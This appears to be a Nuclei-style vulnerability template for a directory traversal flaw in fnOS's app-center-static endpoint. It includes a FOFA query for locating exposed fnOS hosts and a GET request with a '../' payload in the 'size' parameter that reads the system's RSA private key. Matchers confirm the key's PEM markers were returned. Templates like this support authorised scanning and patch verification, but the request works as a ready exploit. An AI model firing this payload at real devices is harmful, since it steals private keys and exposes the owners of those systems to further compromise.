id: poc-yaml-fnos-app-center-static-directory-traversal
info:
  name: fnOS app-center-static Directory Traversal Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: directory-traversal
  metadata:
    finger: fnos
    fofa: app="飞牛-私有云fnOS"
http:
  - method: GET
    path:
      - "/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../usr/trim/etc/rsa_private_key.pem"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "BEGIN PRIVATE KEY"
          - "END PRIVATE KEY"
      - type: regex
        part: body
        regex:
          - "(\\n([A-Za-z0-9+\\/]+\\s*)*={0,2}\\n)"
      - type: word
        part: header
        words:
          - "application/x-x509-ca-cert"
      - type: word
        part: body
        words:
          - "<"
        negative: true
